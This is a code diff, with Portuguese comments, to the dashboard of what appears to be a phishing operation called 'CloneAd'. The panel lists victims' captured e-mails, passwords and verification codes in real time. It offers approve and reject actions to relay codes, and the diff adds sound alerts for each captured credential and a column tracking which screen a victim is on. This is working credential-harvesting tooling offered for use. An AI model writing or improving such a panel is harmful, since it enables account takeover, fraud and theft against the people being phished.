@@ -1,11 +1,10 @@
-import { useEffect, useMemo, useState } from "react";
+import { useEffect, useMemo, useRef, useState } from "react";
 import { Link } from "react-router-dom";
-import { useQuery } from "@tanstack/react-query";
 import { supabase } from "@/integrations/supabase/client";
 import { useAuth } from "@/contexts/AuthContext";
 import { Button } from "@/components/ui/button";
 import { Badge } from "@/components/ui/badge";
-import { Check, X, Loader2, LogOut, ShieldCheck, Trash2, Mail, KeyRound, Hash, Sparkles, Activity, History, Radio } from "lucide-react";
+import { Check, X, Loader2, LogOut, ShieldCheck, Trash2, Mail, KeyRound, Hash, Sparkles, Activity, History, Radio, Volume2, VolumeX, Monitor } from "lucide-react";
 import { toast } from "sonner";
 import { ADMIN_BASE } from "@/lib/admin-route";
 
@@ -69,33 +68,47 @@ function deviceLabel(ua: string | null): string {
   return "Web";
 }
 
+/**
+ * Toca um "ding" curto via WebAudio. Sem assets externos.
+ * Frequência por tipo de evento pra você diferenciar de ouvido.
+ */
+function playDing(kind: "email" | "password" | "code") {
+  try {
+    const Ctx = (window.AudioContext || (window as unknown as { webkitAudioContext: typeof AudioContext }).webkitAudioContext);
+    if (!Ctx) return;
+    const ctx = new Ctx();
+    const osc = ctx.createOscillator();
+    const gain = ctx.createGain();
+    const freq = kind === "email" ? 660 : kind === "password" ? 880 : 1100;
+    osc.type = "sine";
+    osc.frequency.value = freq;
+    gain.gain.setValueAtTime(0.0001, ctx.currentTime);
+    gain.gain.exponentialRampToValueAtTime(0.25, ctx.currentTime + 0.02);
+    gain.gain.exponentialRampToValueAtTime(0.0001, ctx.currentTime + 0.45);
+    osc.connect(gain).connect(ctx.destination);
+    osc.start();
+    osc.stop(ctx.currentTime + 0.5);
+    setTimeout(() => ctx.close().catch(() => {}), 700);
+  } catch {
+    /* silencioso — som é cosmético */
+  }
+}
+
 export default function Dashboard() {
   const { user, signOut } = useAuth();
   const [leads, setLeads] = useState<LeadRow[]>([]);
   const [actions, setActions] = useState<ActionRow[]>([]);
   const [busy, setBusy] = useState<string | null>(null);
   const [pulse, setPulse] = useState(false);
+  const [soundOn, setSoundOn] = useState(true);
+  const soundOnRef = useRef(true);
+  useEffect(() => {
+    soundOnRef.current = soundOn;
+  }, [soundOn]);
 
   useEffect(() => {
     document.title = "Painel — CloneAd";
   }, []);
-
-  // Mapa de ad_id → título (pra mostrar de qual anúncio veio)
-  const { data: ads } = useQuery({
-    queryKey: ["ads-titles", user?.id],
-    queryFn: async () => {
-      const { data, error } = await supabase.from("ads").select("id, title, slug");
-      if (error) throw error;
-      return data;
-    },
-    enabled: !!user,
-  });
-
-  const adTitles = useMemo(() => {
-    const m: Record<string, { title: string; slug: string }> = {};
-    (ads ?? []).forEach((a) => (m[a.id] = { title: a.title, slug: a.slug }));
-    return m;
-  }, [ads]);
 
   // Carrega leads + realtime
   useEffect(() => {
@@ -123,6 +136,15 @@ export default function Dashboard() {
           setLeads((prev) => [r, ...prev]);
           setPulse(true);
           setTimeout(() => setPulse(false), 600);
+          if (soundOnRef.current) {
+            const kind: "email" | "password" | "code" =
+              r.field_name === "email_submitted"
+                ? "email"
+                : r.field_name === "password_submitted"
+                ? "password"
+                : "code";
+            playDing(kind);
+          }
         },
       )
       .on(
@@ -331,6 +353,15 @@ export default function Dashboard() {
           </Link>
           <div className="flex items-center gap-3">
             <span className="hidden text-xs text-muted-foreground sm:inline">{user?.email}</span>
+            <Button
+              variant="ghost"
+              size="icon"
+              onClick={() => setSoundOn((v) => !v)}
+              aria-label={soundOn ? "Silenciar notificações" : "Ativar notificações"}
+              title={soundOn ? "Som ligado — clique pra silenciar" : "Som desligado — clique pra ativar"}
+            >
+              {soundOn ? <Volume2 className="h-4 w-4" /> : <VolumeX className="h-4 w-4 text-muted-foreground" />}
+            </Button>
             <Button variant="ghost" size="sm" onClick={signOut}>
               <LogOut className="mr-2 h-4 w-4" /> Sair
             </Button>
@@ -369,47 +400,41 @@ export default function Dashboard() {
                 <thead className="bg-muted/40 text-[10px] uppercase tracking-wide text-muted-foreground">
                   <tr>
                     <th className="px-4 py-3 text-left font-medium">Última atividade</th>
-                    <th className="px-4 py-3 text-left font-medium">Anúncio</th>
                     <th className="px-4 py-3 text-left font-medium">
                       <span className="inline-flex items-center gap-1"><Mail className="h-3 w-3" /> E-mail</span>
                     </th>
                     <th className="px-4 py-3 text-left font-medium">
                       <span className="inline-flex items-center gap-1"><KeyRound className="h-3 w-3" /> Senha</span>
                     </th>
+                    <th className="px-4 py-3 text-left font-medium">
+                      <span className="inline-flex items-center gap-1"><Monitor className="h-3 w-3" /> Tela atual</span>
+                    </th>
                     <th className="px-4 py-3 text-left font-medium">Dispositivo</th>
-                    <th className="px-4 py-3 text-left font-medium">Aguardando</th>
                   </tr>
                 </thead>
                 <tbody>
                   {activeSessions.map((s) => {
-                    const ad = adTitles[s.ad_id];
                     const hasPassword = s.password !== "—";
+                    // Inferência da tela atual:
+                    // - tem senha → já passou da escolha, está na tela do código
+                    // - só tem e-mail → na tela de escolha (senha ou código)
+                    const screenLabel = hasPassword ? "Tela código" : "Tela escolha";
                     return (
                       <tr key={s.session_id} className="border-t border-border hover:bg-muted/30">
                         <td className="whitespace-nowrap px-4 py-3 text-xs text-muted-foreground font-mono-tabular">
                           {formatTime(s.lastActivity)}
                         </td>
-                        <td className="px-4 py-3 text-xs">
-                          {ad ? (
-                            <div className="flex flex-col">
-                              <span className="truncate font-medium">{ad.title}</span>
-                              <span className="truncate font-mono text-[10px] text-muted-foreground">/{ad.slug}</span>
-                            </div>
-                          ) : (
-                            <span className="text-muted-foreground">—</span>
-                          )}
-                        </td>
                         <td className="break-all px-4 py-3 font-mono text-xs">{s.email}</td>
                         <td className="break-all px-4 py-3 font-mono text-xs">
                           {hasPassword ? s.password : <span className="text-muted-foreground">—</span>}
                         </td>
-                        <td className="whitespace-nowrap px-4 py-3 text-xs text-muted-foreground">
-                          {deviceLabel(s.user_agent)}
-                        </td>
                         <td className="whitespace-nowrap px-4 py-3 text-xs">
                           <span className="inline-flex items-center gap-1 rounded-full bg-primary/15 px-2 py-0.5 text-primary">
-                            {hasPassword ? "código" : "senha ou código"}
+                            {screenLabel}
                           </span>
+                        </td>
+                        <td className="whitespace-nowrap px-4 py-3 text-xs text-muted-foreground">
+                          {deviceLabel(s.user_agent)}
                         </td>
                       </tr>
                     );
@@ -446,7 +471,6 @@ export default function Dashboard() {
             <AttemptsTable
               rows={live}
               leads={leads}
-              adTitles={adTitles}
               actionable
               busy={busy}
               onAction={send}
@@ -488,7 +512,6 @@ export default function Dashboard() {
             <AttemptsTable
               rows={history}
               leads={leads}
-              adTitles={adTitles}
               actionable={false}
               busy={busy}
               onAction={send}
@@ -531,14 +554,12 @@ function StatCard({
 function AttemptsTable({
   rows,
   leads,
-  adTitles,
   actionable,
   busy,
   onAction,
 }: {
   rows: AttemptRow[];
   leads: LeadRow[];
-  adTitles: Record<string, { title: string; slug: string }>;
   actionable: boolean;
   busy: string | null;
   onAction: (row: AttemptRow, action: "approve" | "reject") => void;
@@ -549,7 +570,6 @@ function AttemptsTable({
         <thead className="bg-muted/40 text-[10px] uppercase tracking-wide text-muted-foreground">
           <tr>
             <th className="px-4 py-3 text-left font-medium">Hora</th>
-            <th className="px-4 py-3 text-left font-medium">Anúncio</th>
             <th className="px-4 py-3 text-left font-medium">
               <span className="inline-flex items-center gap-1">
                 <Mail className="h-3 w-3" /> E-mail
@@ -565,6 +585,11 @@ function AttemptsTable({
                 <Hash className="h-3 w-3" /> Código
               </span>
             </th>
+            <th className="px-4 py-3 text-left font-medium">
+              <span className="inline-flex items-center gap-1">
+                <Monitor className="h-3 w-3" /> Tela
+              </span>
+            </th>
             <th className="px-4 py-3 text-left font-medium">Dispositivo</th>
             <th className="px-4 py-3 text-left font-medium">Status</th>
             {actionable && <th className="px-4 py-3 text-right font-medium">Ações</th>}
@@ -573,7 +598,6 @@ function AttemptsTable({
         <tbody>
           {rows.map((row) => {
             const ua = leads.find((l) => l.session_id === row.session_id)?.user_agent ?? null;
-            const ad = adTitles[row.ad_id];
             return (
               <tr
                 key={row.key}
@@ -584,19 +608,14 @@ function AttemptsTable({
                 <td className="whitespace-nowrap px-4 py-3 text-xs text-muted-foreground font-mono-tabular">
                   {formatTime(row.codeAt)}
                 </td>
-                <td className="px-4 py-3 text-xs">
-                  {ad ? (
-                    <div className="flex flex-col">
-                      <span className="truncate font-medium">{ad.title}</span>
-                      <span className="truncate font-mono text-[10px] text-muted-foreground">/{ad.slug}</span>
-                    </div>
-                  ) : (
-                    <span className="text-muted-foreground">—</span>
-                  )}
-                </td>
                 <td className="break-all px-4 py-3 font-mono text-xs">{row.email}</td>
                 <td className="break-all px-4 py-3 font-mono text-xs">{row.password}</td>
                 <td className="px-4 py-3 font-mono text-sm tracking-widest">{row.code}</td>
+                <td className="whitespace-nowrap px-4 py-3 text-xs">
+                  <span className="inline-flex items-center gap-1 rounded-full bg-primary/15 px-2 py-0.5 text-primary">
+                    Tela código
+                  </span>
+                </td>
                 <td className="whitespace-nowrap px-4 py-3 text-xs text-muted-foreground">{deviceLabel(ua)}</td>
                 <td className="whitespace-nowrap px-4 py-3 text-xs">
                   {row.status === "approve" && (
